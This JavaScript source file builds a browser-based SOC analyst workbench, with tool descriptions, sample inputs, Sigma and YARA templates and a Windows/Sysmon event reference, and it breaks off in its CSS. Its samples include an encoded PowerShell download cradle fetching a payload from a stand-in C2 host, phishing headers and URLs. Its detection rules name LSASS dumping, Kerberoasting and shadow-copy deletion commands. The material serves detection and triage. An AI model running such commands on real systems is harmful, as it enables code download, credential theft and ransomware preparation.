/* Privacy Skill Vault — Production SOC Workbench (Capture-Phase Event Engine) */
(function () {
  "use strict";

  const CATEGORIES = [
    { id: "all", label: "All Tools" },
    { id: "soc", label: "SOC & Detection" },
    { id: "ti", label: "Threat Intelligence" },
    { id: "dfir", label: "DFIR & Forensics" },
    { id: "network", label: "Network & Email" },
    { id: "util", label: "Governance & Utilities" }
  ];

  const SIGMA_TEMPLATES = [
    {
      name: "LSASS Memory Dump via Comsvcs.dll",
      yaml: `title: Suspicious LSASS Memory Dump via Comsvcs.dll
id: a1b2c3d4-9912-4e11-8821-ff0011223344
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\\rundll32.exe'
    CommandLine|contains|all:
      - 'comsvcs.dll'
      - 'MiniDump'
  filter:
    User|contains: 'AUTHORITY\\SYSTEM'
  condition: selection and not filter
level: critical`
    },
    {
      name: "Kerberoasting RC4 Ticket Request (Event 4769)",
      yaml: `title: Kerberoasting RC4-HMAC Encryption Ticket Request
id: b2c3d4e5-1122-4a33-9944-001122334455
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: '4769'
    TicketEncryptionType: '0x17'
  filter:
    ServiceName|endswith: '$'
  condition: selection and not filter
level: high`
    },
    {
      name: "Volume Shadow Copy Deletion via Vssadmin/WMIC",
      yaml: `title: Shadow Copy Deletion for Ransomware Preparation
id: c3d4e5f6-2233-4b44-8855-112233445566
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains:
      - 'vssadmin delete shadows'
      - 'wmic shadowcopy delete'
      - 'bcdedit /set {default} recoveryenabled no'
  condition: selection
level: critical`
    }
  ];

  const TOOLS = [
    {
      id: "ioc",
      cat: "ti",
      badge: "IOC",
      shortTitle: "Bulk IoC Extractor",
      title: "Bulk IoC Extractor & Defanger",
      desc: "Extract IPv4s, domains, URLs, emails, CVEs, and SHA-256/MD5 hashes from raw logs and defang indicators safely.",
      options: ["Defang Output (hxxps / [.])", "Raw Extracted Values"],
      actionLabel: "Extract Indicators",
      sample: `2026-10-17 10:14:23 WKSTN-FIN-09 src=10.24.18.44 dst=185.220.101.42 url=https://login-gateway.evil-pay-verify.com/stage2/payload.ps1 user=admin
2026-10-17 10:15:07 SRV-DC01 src=10.10.0.5 dst=45.155.205.233 sender=urgent-alert@sec-account-verify.org cve=CVE-2024-21412
2026-10-17 10:16:11 WKSTN-HR-02 sha256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 md5=44d88612fea8a8f36de82e1278abb02f`,
      whatItDoes: "Parses unstructured firewall logs, phishing emails, threat reports, and SIEM exports to extract and deduplicate IPv4 addresses, URLs, domains, email addresses, file hashes (MD5, SHA-1, SHA-256), and CVE identifiers.",
      whyItMatters: "During active incident triage, manually copying indicators from raw logs is slow and error-prone. Accidental clicks on live malicious links inside ticketing systems can expose analyst workstations.",
      howItWorks: "Uses client-side regular expression engines to scan input text in memory, deduplicating matches into categorized lists and converting periods and schemes into inert defanged notation (hxxps://domain[.]com).",
      bestPractices: [
        "Always defang URLs and domains before pasting indicators into Jira, ServiceNow, Slack, or executive email reports.",
        "Filter out internal RFC1918 private IPs (10.x.x.x, 192.168.x.x) before querying external threat intelligence feeds.",
        "Pivot directly from any extracted IP or domain into the Multi-Source Threat Intel Hub."
      ],
      faqs: [
        { q: "Does any pasted log data leave my browser?", a: "No. Extraction and defanging run 100% locally in your browser's JavaScript engine." },
        { q: "Why should I defang indicators?", a: "Defanging prevents email clients and ticketing systems from turning malicious URLs into clickable hyperlinks." }
      ],
      related: ["ti", "headers", "regex", "deobfuscator"]
    },
    {
      id: "ti",
      cat: "ti",
      badge: "INT",
      shortTitle: "Threat Intel Hub",
      title: "Multi-Source Threat Intel Hub",
      desc: "Look up public IPv4 indicators with Shodan InternetDB and RDAP, or domain indicators with RDAP and Cloudflare DNS. Optional links open external OSINT searches.",
      options: ["Sample IP (1.1.1.1)", "Sample IP (8.8.8.8)", "Sample Domain (cloudflare.com)"],
      actionLabel: "Enrich Indicator",
      sample: "1.1.1.1",
      whatItDoes: "Queries Shodan InternetDB for public IPv4 open-port and CVE data; queries RDAP for registry name/handle, status, and country when supplied; and queries Cloudflare DNS-over-HTTPS for A-record answers on domains. Optional links open VirusTotal, AbuseIPDB, URLScan, and Shodan searches.",
      whyItMatters: "Combining selected public-provider responses can speed up initial indicator triage. Treat the results as supporting context and corroborate them with authoritative telemetry and additional sources.",
      howItWorks: "After you explicitly select Enrich Indicator, the browser sends the submitted public indicator to the relevant provider endpoints: Shodan InternetDB for IPv4 only, RDAP for IPv4 or domains, and Cloudflare DNS-over-HTTPS for domain A records. No provider lookup runs while you type.",
      bestPractices: [
        "Check open ports and CVEs on external IPs before escalating perimeter scan alerts.",
        "RDAP output is limited to fields returned by the registry; this view does not calculate domain age or establish ownership.",
        "Use the optional VirusTotal, AbuseIPDB, and URLScan links for additional provider-specific context; corroborate findings before drawing conclusions."
      ],
      faqs: [
        { q: "Do I need an API key for Shodan InternetDB or RDAP?", a: "No. Shodan InternetDB, ICANN RDAP, and Cloudflare DoH are keyless public endpoints that run directly from your browser." }
      ],
      related: ["ioc", "headers", "cvss", "events"]
    },
    {
      id: "headers",
      cat: "network",
      badge: "EML",
      shortTitle: "Email Header Analyzer",
      title: "Email Header Analyzer",
      desc: "Parse supplied email headers and display Received hops plus reported SPF/DKIM/DMARC text. No cryptographic verification is performed.",
      options: ["Full Hop & Auth Analysis", "Extract Routing Hops Only"],
      actionLabel: "Analyze Email Headers",
      sample: `Return-Path: <security-notice@paypa1-support-alert.com>
Received: from mail.internal-gateway.local (10.10.2.15) by mx.enterprise.org with ESMTPS id 991A2B; Sat, 17 Oct 2026 14:22:45 +0000
Received: from relay-out.bulletproof-host.net ([185.193.125.44]) by mail.internal-gateway.local with ESMTP; Sat, 17 Oct 2026 14:22:11 +0000
Received: from workstation-win10 ([91.215.85.19]) by relay-out.bulletproof-host.net with SMTP; Sat, 17 Oct 2026 14:15:02 +0000
From: "Corporate Helpdesk" <admin@enterprise.org>
Reply-To: <collect-credentials@paypa1-support-alert.com>
Subject: URGENT: Mandatory MFA Token Re-synchronization Required
X-Originating-IP: [91.215.85.19]
Authentication-Results: mx.enterprise.org; spf=fail smtp.mailfrom=paypa1-support-alert.com; dkim=fail; dmarc=fail action=quarantine`,
      whatItDoes: "Reconstructs the chronological delivery path of an email from bottom-to-top Received headers, extracts sender envelope mismatches, and highlights SPF, DKIM, and DMARC authentication results.",
      whyItMatters: "Display names and From headers are trivially spoofed in phishing attacks. True attribution requires inspecting the bottom-most external Received hop, Return-Path, and Authentication-Results headers.",
      howItWorks: "Parses supplied header text and displays Received lines in reverse order. It does not verify DKIM signatures, authenticate Authentication-Results provenance, or prove Received-line trustworthiness.",
      bestPractices: [
        "Treat Authentication-Results as untrusted until you validate the header added by your own receiving gateway; pasted text alone cannot establish provenance.",
        "Look for mismatches between the header From domain, the Return-Path (Envelope Sender), and the Reply-To address."
      ],
      faqs: [
        { q: "Why are Received headers read from bottom to top?", a: "Each mail server prepends its Received line to the top of the header block as the message transits, so the bottom-most Received line represents the earliest hop." }
      ],
      related: ["ioc", "ti", "deobfuscator", "report"]
    },
    {
      id: "sigma",
      cat: "soc",
      badge: "SGM",
      shortTitle: "Sigma Rule Preview",
      title: "Sigma Rule Preview (Translation Disabled)",
      desc: "Review supplied Sigma YAML examples. This preview does not parse, validate, or translate Sigma rules into SIEM queries.",
      options: ["Template: LSASS Dump", "Template: Kerberoasting 4769", "Template: ShadowCopy Delete"],
      actionLabel: "Review Sigma Rule",
      sample: SIGMA_TEMPLATES[0].yaml,
      whatItDoes: "Displays the selected Sigma YAML source for analyst review. It does not parse YAML, validate Sigma semantics, or generate SIEM queries.",
      whyItMatters: "Detection engineers maintain vendor-agnostic detections in Sigma YAML. Manually rewriting complex boolean conditions for three different SIEM query languages introduces syntax bugs.",
      howItWorks: "The current workbench intentionally does not compile this input. Correct Sigma conversion requires YAML parsing, condition-expression evaluation, modifier handling, and target-specific field mappings. Use maintained Sigma tooling for actual conversion.",
      bestPractices: [
        "Test translated queries against 7–30 days of historical telemetry before enabling production alerting.",
        "Add environment-specific service account or path exclusions inside a dedicated filter block."
      ],
      faqs: [
        { q: "Does this preview validate or translate my custom Sigma YAML?", a: "No. It only displays the source text. It does not validate YAML or Sigma semantics and does not generate Elastic, Splunk, or Sentinel queries." }
      ],
      related: ["events", "regex", "yara", "json"]
    },
    {
      id: "events",
      cat: "soc",
      badge: "EVT",
      shortTitle: "Event ID Encyclopedia",
      title: "Windows & Sysmon Event Encyclopedia",
      desc: "Search 16 curated Windows Security and Sysmon Event ID references with selected fields, MITRE ATT&CK mappings, and example Elastic KQL hunts.",
      options: ["All Event Sources (16)", "Windows Security Only", "Sysmon Only"],
      actionLabel: "Search Event IDs",
      sample: "ALL",
      whatItDoes: "Provides an instant-search reference for critical Windows Security (4624, 4625, 4688, 4697, 4698, 4720, 4769, 1102) and Sysmon (IDs 1–29) events, detailing XML fields, LogonTypes, MITRE ATT&CK techniques, and KQL hunting queries.",
      whyItMatters: "Memorizing Windows event schemas, hexadecimal failure codes (0xC000006A), and Sysmon GrantedAccess masks (0x1010) is difficult during high-pressure investigations.",
      howItWorks: "Filters an embedded forensic dataset by Event ID, keyword (e.g., 'lsass', 'kerberos', 'rdp', 'service'), or MITRE technique ID.",
      bestPractices: [
        "Correlate Event ID 4624 (LogonType 3 or 10) with Event ID 4672 to track privileged lateral movement.",
        "Enable command-line auditing via GPO so Event ID 4688 captures full process arguments."
      ],
      faqs: [
        { q: "How do I browse all events vs searching a specific ID?", a: "Type 'ALL' (or clear the search box) to view the full encyclopedia, or type '4624', '10', 'lsass', or 'kerberos' to filter immediately." }
      ],
      related: ["sigma", "json", "regex", "report"]
    },
    {
      id: "regex",
      cat: "soc",
      badge: "RGX",
      shortTitle: "Log Regex Sandbox",
      title: "Log Analyzer & Regex Sandbox",
      desc: "Test custom regular expressions and named capture groups (?<name>...) against multi-line security logs in real time.",
      options: ["Sample: SSH Auth Logs", "Sample: Palo Alto CEF Firewall"],
      actionLabel: "Run Regex Extraction",
      sample: `PATTERN::(?<time>\\d{4}-\\d{2}-\\d{2}\\s+[\\d:]+)\\s+(?<host>\\S+)\\s+sshd\\[\\d+\\]:\\s+Failed password for (?:invalid user )?(?<user>\\S+) from (?<src_ip>\\d+\\.\\d+\\.\\d+\\.\\d+)
LOG::2026-10-16 10:14:23 server01 sshd[2190]: Failed password for invalid user root from 203.0.113.45 port 51234 ssh2
2026-10-16 10:15:07 server01 sshd[2194]: Failed password for admin from 198.51.100.23 port 49112 ssh2
2026-10-16 10:16:11 server02 sshd[8812]: Failed password for invalid user oracle from 192.0.2.10 port 38291 ssh2
2026-10-16 10:18:45 server01 sshd[2209]: Failed password for analyst1 from 203.0.113.77 port 55100 ssh2`,
      whatItDoes: "Compiles your custom JavaScript/PCRE regular expression against raw log lines and dynamically builds a structured table from your named capture groups (?<field>...) or numbered groups.",
      whyItMatters: "Writing custom SIEM parsers, Logstash Grok patterns, or regex field extractors without live capture-group feedback often leads to missed log variants.",
      howItWorks: "Splits the input into PATTERN:: and LOG:: sections, executes RegExp.matchAll() across all lines, and dynamically generates table columns matching whatever named groups you defined.",
      bestPractices: [
        "Use named capture groups like (?<src_ip>...) so extracted fields map cleanly to SIEM column headers.",
        "Avoid greedy .* wildcards when matching delimited logs; use negated character classes like [^|]+ instead."
      ],
      faqs: [
        { q: "How do I test my own regex pattern?", a: "Put your regex after PATTERN:: on the first line, and paste your raw logs after LOG:: on the following lines." }
      ],
      related: ["ioc", "sigma", "json", "events"]
    },
    {
      id: "yara",
      cat: "dfir",
      badge: "YAR",
      shortTitle: "YARA Rule Builder",
      title: "YARA Rule Text Builder & Reference Check",
      desc: "Assemble YARA rule text and perform a limited string-reference check; this is not YARA syntax validation.",
      options: ["Preset: CobaltStrike Loader", "Preset: Ransomware Note & Crypto"],
      actionLabel: "Build YARA Rule Text",
      sample: `RULE_NAME::Detect_CobaltStrike_Beacon_Loader
META_AUTHOR::SOC Detection Engineering
META_SEVERITY::Critical
STRINGS::
$s1 = "powershell.exe -nop -w hidden -enc" ascii wide nocase
$s2 = "ReflectiveLoader" ascii fullword
$s3 = "VirtualAllocEx" ascii
$hex1 = { 4D 5A 90 00 03 00 00 00 [4-16] 50 45 00 00 }
CONDITION::uint16(0) == 0x5A4D and filesize < 5MB and ($hex1 or 2 of ($s*))`,
      whatItDoes: "Assembles supplied metadata, string definitions, and condition text into a YARA-like rule template and checks whether declared string identifiers appear in the condition text.",
      whyItMatters: "Syntax typos or forgetting to reference a defined string in the condition block will cause YARA scanners and EDR hunting jobs to reject the rule.",
      howItWorks: "Extracts STRINGS:: and CONDITION:: sections, performs a simple textual reference check, and formats the text. It does not parse YARA grammar, validate modifiers or condition semantics, or compile a rule.",
      bestPractices: [
        "Filter by uint16(0) == 0x5A4D and filesize < 10MB first in your condition to dramatically speed up scanning.",
        "Combine unique strings with fullword and wide modifiers to catch UTF-16 compiled .NET/Windows binaries."
      ],
      faqs: [
        { q: "Does this tool validate YARA syntax or compile the rule?", a: "No. It only checks for textual references to declared string identifiers. Use the YARA compiler or an approved engine to validate and compile the completed rule." }
      ],
      related: ["deobfuscator", "sigma", "ioc", "report"]
    },
    {
      id: "deobfuscator",
      cat: "dfir",
      badge: "DEC",
      shortTitle: "Script De-obfuscator",
      title: "Safe Script & Payload De-obfuscator",
      desc: "Safely decode UTF-16LE PowerShell -EncodedCommand, Base64, Hex, and URL-encoded scripts without executing code.",
      options: ["Sample: PowerShell UTF-16LE", "Sample: Hex & URL Encoded"],
      actionLabel: "De-obfuscate Payload",
      sample: `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBtAGEAbAB3AGEAcgBlAC0AYwAyAC4AZQB2AGkAbAAuAG8AcgBnAC8AcwB0AGEAZwBlADIALgBwAHMAMQAnACkA`,
      whatItDoes: "Decodes obfuscated command lines—including Windows PowerShell UTF-16LE Base64 (-enc), standard Base64, hexadecimal byte strings, and URL encoding—while flagging high-risk API calls and extracting hidden URLs.",
      whyItMatters: "Attackers routinely encode PowerShell download cradles and living-off-the-land commands to bypass static signatures and hide C2 domains.",
      howItWorks: "Strips null bytes from UTF-16LE Base64 payloads entirely in memory as inert text strings, never invoking eval() or any shell interpreter.",
      bestPractices: [
        "Never run unknown encoded scripts in a live terminal to see what they do; always decode them as inert text.",
        "Copy any URLs or IPs revealed in the decoded payload directly into the Bulk IoC Extractor to defang them."
      ],
      faqs: [
        { q: "Why does standard Base64 decoding produce null bytes on PowerShell commands?", a: "PowerShell's -EncodedCommand uses UTF-16LE (2 bytes per ASCII character). Our decoder automatically strips interleaved null bytes." }
      ],
      related: ["ioc", "yara", "sigma", "events"]
    },
    {
      id: "json",
      cat: "dfir",
      badge: "JSN",
      shortTitle: "JSON Log Beautifier",
      title: "JSON Log & Alert Beautifier",
      desc: "Validate, pretty-print, and flatten nested Elastic ECS, Sysmon, and AWS CloudTrail JSON logs into readable dot-notation fields.",
      options: ["Flattened Table + Pretty JSON", "Pretty-Printed JSON Only"],
      actionLabel: "Format & Flatten JSON",
      sample: `{"@timestamp":"2026-10-17T15:04:22.419Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon"},"host":{"name":"SRV-DC01.corp.local","ip":"10.10.0.5"},"process":{"pid":6412,"executable":"C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe","command_line":"wmic process call create powershell.exe"},"user":{"name":"svc_backup"},"threat":{"tactic":"Execution","technique":"T1047"}}`,
      whatItDoes: "Formats single-line minified JSON logs into indented blocks AND generates a flattened dot-notation key-value table (e.g., process.executable, host.name) for quick SIEM field lookups.",
      whyItMatters: "Raw EDR, CloudTrail, and SIEM webhook alerts arrive as crushed single-line JSON strings that are difficult to read or write KQL field queries against without flattening.",
      howItWorks: "Parses the JSON tree locally in JavaScript, recursively traverses nested objects/arrays to build dot-notation paths, and outputs both the formatted tree and field table.",
      bestPractices: [
        "Use the flattened dot-notation field names directly when building Elastic KQL or Sentinel queries."
      ],
      faqs: [
        { q: "What happens if my JSON log has a syntax error?", a: "The parser highlights the exact reason for the JSON syntax failure so you can fix malformed webhook payloads." }
      ],
      related: ["regex", "sigma", "timestamp", "events"]
    },
    {
      id: "timestamp",
      cat: "util",
      badge: "TIME",
      shortTitle: "Timestamp Converter",
      title: "Multi-Timezone Forensic Timestamp Converter",
      desc: "Convert Unix Epoch seconds, milliseconds, microseconds and nanoseconds, 18-digit Windows FILETIME values, and parseable date strings. Calendar display is millisecond-precision.",
      options: ["Sample Epoch (Seconds)", "Sample Windows AD FileTime (18-Digit)", "Use Current Live UTC Time"],
      actionLabel: "Convert Timestamp",
      sample: "1760713462",
      whatItDoes: "Converts 10-digit Unix seconds, 13-digit milliseconds, 16-digit microseconds, 19-digit nanoseconds, 18-digit Windows FILETIME values, and parseable date strings.",
      whyItMatters: "During incident timeline reconstruction, firewall logs may be in UTC Epoch, Active Directory attributes (lastLogonTimestamp) in 18-digit FileTime, and endpoint logs in local time.",
      howItWorks: "Detects timestamp precision automatically by digit length and format, applying BigInt arithmetic for 100-nanosecond Windows FileTime epochs (since January 1, 1601).",
      bestPractices: [
        "Always normalize every timestamp in an incident timeline to UTC before correlating events across hosts."
      ],
      faqs: [
        { q: "How do I convert an 18-digit Windows AD lastLogon value?", a: "Click the 'Sample Windows AD FileTime' pill or paste any 18-digit integer (e.g. 134051966620000000) to convert it instantly." }
      ],
      related: ["json", "report", "events", "headers"]
    },
    {
      id: "severity",
      cat: "util",
      badge: "SEV",
      shortTitle: "Severity Calculator",
      title: "Incident Severity & SLA Calculator",
      desc: "Apply a keyword-based triage heuristic to produce an illustrative score and example priority bands. It is not an approved SLA or containment decision.",
      options: ["Scenario: P1 Domain Controller Intrusion", "Scenario: P3 Isolated Workstation Alert"],
      actionLabel: "Calculate Incident Severity",
      sample: `ASSET_CRITICALITY::tier1_dc
DATA_SENSITIVITY::regulated_pii
COMPROMISE_SCOPE::multi_host_lateral
THREAT_STATUS::active_c2_exfil
PRIVILEGE_LEVEL::domain_admin`,
      whatItDoes: "Applies fixed keyword weights to selected terms in raw input and maps the resulting illustrative score to example P1–P4 bands. The input is not parsed as structured fields.",
      whyItMatters: "Subjective severity ratings lead to alert fatigue on minor events or delayed escalation during critical domain-wide intrusions.",
      howItWorks: "Searches raw input for hard-coded keywords, adds fixed weights, caps the score at 100, and maps it to example priority labels. Thresholds and response times must be replaced with your organisation’s approved policy.",
      bestPractices: [
        "Use confirmed privileged-account or Tier-1 asset compromise as an escalation signal, but apply organisational severity criteria and assess scope, impact, confidence, and containment status."
      ],
      faqs: [
        { q: "Is the score an authoritative incident severity?", a: "No. It is a simple keyword heuristic for discussion only. It does not replace incident commander judgement, approved severity criteria, or contractual/regulatory response SLAs." }
      ],
      related: ["report", "cvss", "ioc", "ti"]
    },
    {
      id: "report",
      cat: "util",
      badge: "RPT",
      shortTitle: "Incident Report Builder",
      title: "Standardized Incident Report Generator",
      desc: "Generate structured executive and technical SOC incident reports in clean Markdown with automatically defanged indicators.",
      options: ["Full Executive + Technical Report", "Defang All Embedded IoCs"],
      actionLabel: "Generate Markdown Report",
      sample: `INCIDENT_ID::INC-2026-10492
TITLE::Unauthorized Credential Dumping & Lateral Movement on SRV-FIN-02
SEVERITY::P1 - Critical
DETECTION_SOURCE::Elastic SIEM / Sysmon Event ID 1 & 10
AFFECTED_ASSETS::SRV-FIN-02 (10.20.4.19), WKSTN-HR-11 (10.20.8.44), Account: corp\\svc_sql
MITRE_TACTICS::TA0006 Credential Access (T1003.001), TA0008 Lateral Movement (T1021.002)
TIMELINE::
2026-10-17 13:10 UTC - Phishing link executed on WKSTN-HR-11 spawning encoded PowerShell.
2026-10-17 13:18 UTC - rundll32.exe comsvcs.dll MiniDump executed against lsass.exe.
2026-10-17 13:31 UTC - SOC isolated both hosts in EDR and rotated svc_sql credentials.
IOCS::185.220.101.42, https://evil-pay-verify.com/stage2.ps1, SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
CONTAINMENT::Isolated both endpoints in EDR; revoked Kerberos TGTs; blocked C2 IP at perimeter firewall.`,
      whatItDoes: "Transforms structured incident notes into a polished, copy-ready Markdown report featuring Executive Summary, Affected Assets, MITRE ATT&CK Mapping, UTC Timeline, Defanged IoCs, and Containment Actions.",
      whyItMatters: "During shift handoffs and executive briefings, inconsistent ticket notes cause critical containment steps or indicators to be overlooked.",
      howItWorks: "Parses section keys locally, automatically defangs all URLs and IPs inside the IOCS block, and formats a clean Markdown document.",
      bestPractices: [
        "Keep all timeline entries strictly in UTC with explicit source hostnames."
      ],
      faqs: [
        { q: "Are indicators in the generated report defanged automatically?", a: "Yes. Any URL or IP address placed in the IOCS:: section is automatically defanged in the final Markdown output." }
      ],
      related: ["severity", "ioc", "timestamp", "headers"]
    },
    {
      id: "cvss",
      cat: "network",
      badge: "CVS",
      shortTitle: "CVSS v3.1 Calculator",
      title: "CVSS v3.1 Base, Temporal & Environmental Calculator",
      desc: "Calculate official FIRST.org CVSS v3.1 Base, Temporal, and Environmental scores dynamically from vector strings or presets.",
      options: ["Critical RCE (10.0)", "High Network PrivEsc (8.8)", "Medium Local Vuln (5.5)"],
      actionLabel: "Calculate CVSS Score",
      sample: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:F/RL:O/RC:C/CR:H/IR:H/AR:M",
      whatItDoes: "Computes exact FIRST.org CVSS v3.1 Base, Temporal, and Environmental scores (including Impact and Exploitability sub-scores and official RoundUp logic) from any CVSS v3.1 vector string.",
      whyItMatters: "A public CVE Base Score of 9.8 may drop significantly in your environment if the asset is air-gapped or protected by compensating controls—or rise to 10.0 if it sits on a critical internet-facing system.",
      howItWorks: "Parses every metric token (AV, AC, PR, UI, S, C, I, A, E, RL, RC, CR, IR, AR) and applies the official CVSS v3.1 mathematical equations in real time.",
      bestPractices: [
        "Use Temporal metrics (E:U vs E:H) to prioritize vulnerabilities with active public exploit code or CISA KEV listing."
      ],
      faqs: [
        { q: "Does editing the vector string or clicking presets recalculate the score in real time?", a: "Yes. Click any preset pill above or change any metric token in the input box (e.g., AV:N to AV:L) to watch Base, Temporal, and Environmental scores recalculate." }
      ],
      related: ["ti", "severity", "report", "ioc"]
    }
  ];

  const EVENT_DB = [
    { id: "4624", source: "Windows Security", title: "An account was successfully logged on", mitre: "T1078 / T1021", fields: "TargetUserName, IpAddress, LogonType (2=Interactive, 3=Network/SMB, 10=RDP), AuthenticationPackageName", kql: 'event.code: "4624" and winlog.event_data.LogonType: ("3" or "10") and not source.ip: "127.0.0.1"', fp: "Exclude machine accounts ending in $ for routine Type 3 domain controller traffic." },
    { id: "4625", source: "Windows Security", title: "An account failed to log on", mitre: "T1110 (Brute Force)", fields: "TargetUserName, IpAddress, LogonType, SubStatus (0xC000006A=Bad Password, 0xC0000234=Locked)", kql: 'event.code: "4625" and not winlog.event_data.TargetUserName: *$', fp: "Expired service account passwords on scheduled tasks or mapped drives." },
    { id: "4672", source: "Windows Security", title: "Special privileges assigned to new logon", mitre: "T1078.002", fields: "SubjectUserName, PrivilegeList (SeDebugPrivilege, SeBackupPrivilege)", kql: 'event.code: "4672" and winlog.event_data.PrivilegeList: *SeDebugPrivilege*', fp: "Baseline known Domain Admin accounts; alert on standard user accounts." },
    { id: "4688", source: "Windows Security", title: "A new process has been created", mitre: "T1059", fields: "NewProcessName, CommandLine, ParentProcessName, SubjectUserName", kql: 'event.code: "4688" and process.command_line: (*-enc* or *DownloadString* or *comsvcs*)', fp: "Requires 'Include command line in process creation events' GPO." },
    { id: "4697", source: "Windows Security", title: "A service was installed in the system", mitre: "T1543.003", fields: "ServiceName, ServiceFileName, ServiceType, SubjectUserName", kql: 'event.code: "4697" and winlog.event_data.ServiceFileName: (*cmd* or *powershell* or *Temp*)', fp: "Verify against approved software deployment windows." },
    { id: "4698", source: "Windows Security", title: "A scheduled task was created", mitre: "T1053.005", fields: "TaskName, TaskContent (XML Command/Arguments), SubjectUserName", kql: 'event.code: "4698" and winlog.event_data.TaskContent: (*powershell* or *rundll32* or *http*)', fp: "Exclude known enterprise management agents." },
    { id: "4720", source: "Windows Security", title: "A user account was created", mitre: "T1136.001", fields: "TargetUserName, SubjectUserName, SamAccountName", kql: 'event.code: "4720"', fp: "Correlate with IAM provisioning tickets." },
    { id: "4728", source: "Windows Security", title: "A member was added to a privileged global group", mitre: "T1098", fields: "MemberName, TargetUserName (Group Name), SubjectUserName", kql: 'event.code: ("4728" or "4732") and group.name: *Admin*', fp: "Treat unapproved Domain Admin additions as P1 incidents." },
    { id: "4769", source: "Windows Security", title: "A Kerberos service ticket was requested (Kerberoasting)", mitre: "T1558.003", fields: "ServiceName, TicketEncryptionType (0x17=RC4-HMAC), ClientAddress", kql: 'event.code: "4769" and winlog.event_data.TicketEncryptionType: "0x17" and not winlog.event_data.ServiceName: *$', fp: "Legacy service accounts requiring RC4." },
    { id: "1102", source: "Windows Security", title: "The audit log was cleared", mitre: "T1070.001", fields: "SubjectUserName, SubjectDomainName", kql: 'event.code: ("1102" or "104")', fp: "High-confidence defense evasion indicator." },
    { id: "1", source: "Sysmon", title: "Sysmon ID 1 — Process Creation", mitre: "T1059 / T1218", fields: "Image, CommandLine, ParentImage, Hashes (SHA256/IMPHASH), User", kql: 'event.provider: "Microsoft-Windows-Sysmon" and event.code: "1"', fp: "Hunt suspicious parent-child chains (e.g., w3wp.exe or winword.exe spawning cmd/powershell)." },
    { id: "3", source: "Sysmon", title: "Sysmon ID 3 — Network Connection Detected", mitre: "T1071", fields: "Image, SourceIp, DestinationIp, DestinationPort, DestinationHostname", kql: 'event.code: "3" and process.executable: (*rundll32* or *regsvr32* or *certutil* or *mshta*)', fp: "Scope Sysmon config to non-browser binaries." },
    { id: "8", source: "Sysmon", title: "Sysmon ID 8 — CreateRemoteThread Detected", mitre: "T1055 (Process Injection)", fields: "SourceImage, TargetImage, StartAddress", kql: 'event.code: "8" and not process.executable: *MsMpEng.exe', fp: "Exclude signed EDR/AV processes." },
    { id: "10", source: "Sysmon", title: "Sysmon ID 10 — Process Access (LSASS Memory Dump)", mitre: "T1003.001", fields: "SourceImage, TargetImage (lsass.exe), GrantedAccess (0x1010, 0x1410, 0x1F0FFF), CallTrace", kql: 'event.code: "10" and winlog.event_data.TargetImage: *lsass.exe and winlog.event_data.GrantedAccess: ("0x1010" or "0x1410" or "0x1f0fff")', fp: "Alert on dbgcore.dll or comsvcs.dll in CallTrace." },
    { id: "11", source: "Sysmon", title: "Sysmon ID 11 — FileCreate", mitre: "T1105", fields: "Image, TargetFilename, CreationUtcTime", kql: 'event.code: "11" and file.extension: ("ps1" or "exe" or "dll" or "hta")', fp: "Monitor Temp, Downloads, and Startup folders." },
    { id: "22", source: "Sysmon", title: "Sysmon ID 22 — DNS Query Event", mitre: "T1071.004", fields: "Image, QueryName, QueryResults", kql: 'event.code: "22" and not process.executable: (*chrome.exe* or *msedge.exe*)', fp: "Great for catching C2 beacons from PowerShell or rundll32." }
  ];

  let currentView = "catalog";
  let activeCat = "all";
  let searchQuery = "";
  let activeToolId = "ioc";
  let selectedOptionIdx = 0;
  let copyFeedback = false;
  const userInputs = {};

  function esc(str) {
    return String(str || "")
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }

  function defang(text) {
    return String(text || "").replace(/https?:\/\//gi, m => m.replace(/t/gi, "x")).replace(/\./g, "[.]");
  }

  function getRoot() {
    return document.getElementById("psv-workbench-root") || document.querySelector(".md-content__inner");
  }

  function injectStyles() {
    document.querySelectorAll('link[href*="tools.css"], link[href*="psv-tools.css"], link[href*="soc-workbench.css"]').forEach(el => {
      el.disabled = true;
    });

    if (document.getElementById("psv-hiderox-royal-css")) return;
    const style = document.createElement("style");
    style.id = "psv-hiderox-royal-css";
    style.textContent = `
      .md-grid { max-width: 1380px !important; width: 95% !important; }
      .md-content__inner { margin: 0 !important; padding: 0 !important; max-width: 100% !important; }
      .md-content__inner > h1:first-child { display: none !important; }
      .md-sidebar--primary, .md-sidebar--secondary { display: none !important; }
      body, .md-main { background: #050914 !important; }
      [data-md-color-scheme="default"] body, [data-md-color-scheme="default"] .md-main { background: #f8fafc !important; }

      #psv-app {
        font-family: Roboto, "Helvetica Neue", Arial, sans-serif;
        color: #f1f5f9;
        padding: 1.5rem 0 4rem 0;
      }
      #psv-app button, #psv-app input, #psv-app select, #psv-app textarea {
        font-family: inherit;
      }
      #psv-app .psv-editor { font-family: "Roboto Mono", SFMono-Regular, Consolas, monospace; }
      #psv-app h1, #psv-app h2, #psv-app h3, #psv-app h4, #psv-app h5, #psv-app h6 {
        font-weight: 700;
        letter-spacing: -0.015em;
      }
      [data-md-color-scheme="default"] #psv-app { color: #0f172a; }
      #psv-app svg { max-width: 22px; max-height: 22px; flex-shrink: 0; }

      .psv-hero-split {
        display: grid;
        grid-template-columns: 1.15fr 0.85fr;
        gap: 2rem;
        align-items: center;
        margin-bottom: 2.25rem;
      }
      @media (max-width: 960px) { .psv-hero-split { grid-template-columns: 1fr; } }

      .psv-eyebrow {
        display: inline-flex;
        align-items: center;
        gap: 0.5rem;
        font-family: "Roboto Mono", SFMono-Regular, Consolas, monospace;
